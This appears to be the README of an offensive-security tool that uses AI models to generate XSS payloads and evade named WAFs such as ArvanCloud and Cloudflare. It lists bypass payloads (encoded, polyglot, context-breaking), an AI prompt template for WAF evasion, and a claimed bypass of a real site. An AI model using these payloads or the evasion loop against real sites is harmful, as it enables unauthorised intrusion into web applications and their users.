# XSS Hunter - AI-Powered XSS Scanner 🤖

An advanced XSS vulnerability scanner that uses **AI models** to generate intelligent payloads and bypass CDN/WAF protections including ArvanCloud, Cloudflare, Akamai, and more.

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## 🌟 Key Features

### 🤖 AI-Powered Payload Generation
- **OpenAI GPT-4**: Leverage the most powerful OpenAI model
- **Google Gemini 2.5**: Use Google's advanced AI for payload generation
- **Anthropic Claude**: Smart bypass techniques with Claude
- **Ollama (Local)**: Run locally with Llama, Mistral, and other models

### 🛡️ CDN/WAF Detection & Bypass
- **ArvanCloud** (Iranian CDN)
- **Cloudflare**
- **Akamai**
- **Fastly**
- **CloudFront**
- **Incapsula**
- **Sucuri**
- **StackPath**

### 🧠 Advanced Capabilities
- **Adaptive Payloads**: Generates payloads based on detected CDN type
- **Context-Aware**: Detects injection context and uses appropriate payloads
- **Multi-Round Mutations**: AI learns from failed attempts and generates increasingly sophisticated payloads
- **Learning from Failures**: Analyzes blocked patterns and avoids them in subsequent attempts

## 📦 Installation

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Configure API Keys (Optional)

#### Method 1: Environment Variables
```bash
# OpenAI
export OPENAI_API_KEY="your-api-key-here"

# Google Gemini
export GEMINI_API_KEY="your-api-key-here"

# Anthropic Claude
export CLAUDE_API_KEY="your-api-key-here"
```

#### Method 2: Direct Command Line
```bash
python xss_hunter.py -u "URL" --ai openai --api-key "your-key"
```

### 3. Install Ollama (For Local Usage)
```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Download models
ollama pull llama2
# or
ollama pull mistral
ollama pull codellama
```

## 🚀 Usage

### Basic Usage with OpenAI
```bash
python xss_hunter.py -u "http://example.com/search?q=test" \
  --ai openai \
  --api-key "sk-..."
```

### Using Google Gemini
```bash
python xss_hunter.py -u "http://example.com/page?id=1" \
  --ai gemini \
  --api-key "AIza..." \
  -v
```

### Using Anthropic Claude
```bash
python xss_hunter.py -u "http://example.com/search" \
  --ai claude \
  --api-key "sk-ant-..." \
  --scan-forms
```

### Using Ollama (Local & Free)
```bash
# With default model (llama2)
python xss_hunter.py -u "http://example.com/page?id=1" \
  --ai ollama

# With custom model
python xss_hunter.py -u "http://example.com/page?id=1" \
  --ai ollama \
  --ai-model mistral
```

### Without AI (Fallback Mode)
```bash
python xss_hunter.py -u "http://example.com/search?q=test"
```

## 🎯 Real-World Example

### Successful XSS Detection on ArvanCloud-Protected Site

```bash
python xss_hunter.py -u "https://example.ir/xss.php?q=test" \
  --ai gemini \
  --api-key "AIzaSyAH0Yf5ngd......" \
  -v
```

**Output:**
```
╔═══════════════════════════════════════════════════════╗
║           XSS Hunter - AI-Powered Scanner            ║
║              CDN/WAF Bypass Techniques                ║
╚═══════════════════════════════════════════════════════╝

[*] Initializing AI provider: gemini
[+] AI provider initialized successfully

[*] Scanning URL: https://example.ir/xss.php?q=test
[+] Detected protection: arvancloud
[+] Found 1 parameters: q

[*] Testing parameter: q
[*] Generating AI-powered payloads...
[+] Generated 20 AI payloads
[1/20] Testing: <img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;...
[!] VULNERABLE! Payload: <img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

============================================================
XSS SCAN REPORT
============================================================

[!] Found 1 XSS vulnerabilities:

Vulnerability #1:
  URL: https://example.ir/xss.php?q=%3Cimg+src%3Dx+onerror%3D%22%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%22%3E
  Method: GET
  Parameter: q
  Payload: <img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
  Technique: AI-generated
```

**Analysis:**
- ✅ Detected ArvanCloud CDN protection
- ✅ AI generated HTML entity-encoded payload
- ✅ Successfully bypassed ArvanCloud WAF
- ✅ Payload: `<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">`
- ✅ Decoded: `<img src=x onerror="alert(1)">`

## 📚 Practical Examples

### 1. Simple Scan with AI
```bash
python xss_hunter.py \
  -u "http://testphp.vulnweb.com/search.php?test=query" \
  --ai gemini \
  --api-key "YOUR_KEY"
```

### 2. Complete Scan with Verbose Output
```bash
python xss_hunter.py \
  -u "http://example.com/page?id=1&lang=en" \
  --ai openai \
  --api-key "YOUR_KEY" \
  -v \
  --scan-forms
```

### 3. Using Ollama with Custom Model
```bash
python xss_hunter.py \
  -u "http://example.com/search?q=test" \
  --ai ollama \
  --ai-model codellama \
  --ollama-url "http://localhost:11434"
```

### 4. Testing Cloudflare-Protected Site
```bash
python xss_hunter.py \
  -u "https://site-with-cloudflare.com/search?q=test" \
  --ai claude \
  --api-key "YOUR_KEY" \
  -v
```

## 🔧 How It Works

### 1. Environment Detection
```
URL → CDN Detection → Context Analysis → WAF Fingerprinting
```

### 2. AI Payload Generation
```python
AI Prompt:
"Generate XSS payloads to bypass ArvanCloud WAF
Context: HTML injection
Techniques: encoding, obfuscation, HTML5 elements, rare handlers..."

AI Response:
[
  "<img src=x onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
  "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
  "<details open ontoggle=alert(1)>",
  ...
]
```

### 3. Intelligent Testing
```
Test Payload → Failed? → AI Mutation → Retry (up to 3 rounds)
                ↓
            Success! → Report
```

### 4. Multi-Round Learning
```
Round 1: Basic AI payloads (20 payloads)
   ↓ Failed
Round 2: Advanced mutations analyzing what was blocked (15 payloads)
   ↓ Failed
Round 3: Highly obfuscated polyglot payloads (15 payloads)
   ↓
Success or Give Up
```

## 🎨 Bypass Techniques

### 1. Encoding Bypasses
```javascript
// HTML Entities
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

// Base64
<svg/onload=eval(atob('YWxlcnQoMSk='))>

// Character Codes
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// Unicode
<script>alert\u0028\u0031\u0029</script>
```

### 2. HTML5 Bypasses
```html
<details open ontoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<marquee onstart=alert(1)>
<video src=x onloadstart=alert(1)>
```

### 3. Template Literals
```javascript
<script>alert`1`</script>
<img src=x onerror=alert`XSS`>
```

### 4. Context Breaking
```javascript
';alert(1);//
"-alert(1)-"
</script><script>alert(1)</script>
```

### 5. Polyglot Payloads
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1))
```

### 6. Rare/Exotic Vectors
```html
<form><button formaction=javascript:alert(1)>Click</button></form>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## 📊 AI Provider Comparison

| Provider | Speed | Quality | Cost | Local |
|----------|-------|---------|------|-------|
| **OpenAI GPT-4** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 💰💰💰 | ❌ |
| **Google Gemini** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 💰💰 | ❌ |
| **Claude** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 💰💰💰 | ❌ |
| **Ollama** | ⭐⭐ | ⭐⭐⭐ | 🆓 | ✅ |

## 🔍 Command Line Parameters

### Help Output
```bash
$ python xss_hunter.py --help

usage: xss_hunter.py [-h] -u URL [-v] [--scan-forms] [--timeout TIMEOUT]
                     [--ai {openai,gemini,claude,ollama}] [--api-key API_KEY]
                     [--ai-model AI_MODEL] [--ollama-url OLLAMA_URL]

XSS Hunter - AI-Powered XSS Vulnerability Scanner

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL to scan
  -v, --verbose         Verbose output
  --scan-forms          Also scan forms
  --timeout TIMEOUT     Request timeout (default: 10)
  --ai {openai,gemini,claude,ollama}
                        AI provider to use for payload generation
  --api-key API_KEY     API key for AI provider (not needed for Ollama)
  --ai-model AI_MODEL   Specific AI model to use (optional)
  --ollama-url OLLAMA_URL
                        Ollama server URL (default: http://localhost:11434)

Examples:
  xss_hunter.py -u "http://example.com/search?q=test" --ai openai --api-key YOUR_KEY
  xss_hunter.py -u "http://example.com/page.php?id=1" -v --ai gemini --api-key YOUR_KEY
  xss_hunter.py -u "http://example.com/form.html" --scan-forms --ai ollama
  xss_hunter.py -u "http://example.com" --ai claude --api-key YOUR_KEY
```

### Parameter Details

**Main Parameters:**
- `-u, --url URL` - Target URL to scan (required)
- `-v, --verbose` - Enable verbose output to see all payloads being tested
- `--scan-forms` - Also scan HTML forms on the page
- `--timeout TIMEOUT` - Request timeout in seconds (default: 10)

**AI Parameters:**
- `--ai {openai,gemini,claude,ollama}` - Choose AI provider for payload generation
- `--api-key API_KEY` - API key for the selected AI provider (not needed for Ollama)
- `--ai-model MODEL` - Specific AI model to use (optional, uses defaults if not specified)
- `--ollama-url URL` - Ollama server URL (default: http://localhost:11434)

## 🛡️ Security Notes

⚠️ **Legal Warning**: Use this tool only on websites you own or have written permission to test.

⚠️ **Ethical Use**: Do not use this tool for illegal purposes.

⚠️ **Rate Limiting**: The tool automatically applies delays between requests.

⚠️ **Privacy**: Payloads are sent to AI providers for generation.

## 🐛 Troubleshooting

### Problem: Gemini API not working
```bash
# Check API key
echo $GEMINI_API_KEY

# Test connection
curl "https://generativelanguage.googleapis.com/v1beta/models?key=$GEMINI_API_KEY"
```

### Problem: Ollama connection failed
```bash
# Check Ollama status
ollama list

# Restart Ollama
ollama serve
```

### Problem: SSL/Certificate errors
```bash
# Disable SSL verification (testing only)
export PYTHONHTTPSVERIFY=0
```

## 🎓 Advanced Usage

### Custom Payload Generation
The tool uses sophisticated prompts for each CDN type:

**For ArvanCloud:**
- Heavy encoding (HTML entities, unicode, hex)
- Tag obfuscation (comments, null bytes, case mixing)
- Rare event handlers (onanimationstart, onloadstart)
- Advanced vectors (SVG foreignObject, MathML, iframe srcdoc)
- Polyglot payloads

**For Cloudflare:**
- SVG with animate/set elements
- HTML5 form elements with autofocus
- Data URIs with base64
- Unicode normalization tricks

### Multi-Round Mutation System
```python
Round 1: Generate 20 initial payloads based on CDN type
         ↓ All blocked
Round 2: Analyze blocked patterns, generate 15 advanced mutations
         ↓ Still blocked
Round 3: Generate 15 highly obfuscated polyglot payloads
         ↓
         Success or report no vulnerabilities
```

## 📁 Project Structure

```
xss_hunter/
├── xss_hunter.py          # Main scanner tool
├── requirements.txt       # Python dependencies
├── README.md             # This file
└── .gitignore           # Git ignore patterns
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues.

## 📄 License

MIT License - For educational and security testing purposes only.

## 🙏 Acknowledgments

- OpenAI, Google, Anthropic for powerful AI APIs
- Ollama for enabling local AI execution
- Iranian cybersecurity community 🇮🇷
- ArvanCloud for providing a challenging WAF to test against

## 📞 Support

For issues, questions, or suggestions, please open an issue on the repository.

---

**Built with ❤️ and 🤖 for the cybersecurity community**

## 🎯 Success Stories

### ArvanCloud WAF Bypass
Successfully detected XSS vulnerability on ArvanCloud-protected site using HTML entity-encoded payload generated by Gemini AI.

**Target:** `https://aaapentestcdn..ir/xss.php`  
**Protection:** ArvanCloud CDN + WAF  
**Bypass Method:** HTML entity encoding  
**Payload:** `<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">`  
**Result:** ✅ Successful XSS execution

This demonstrates the power of AI-generated payloads in bypassing modern WAF protections.
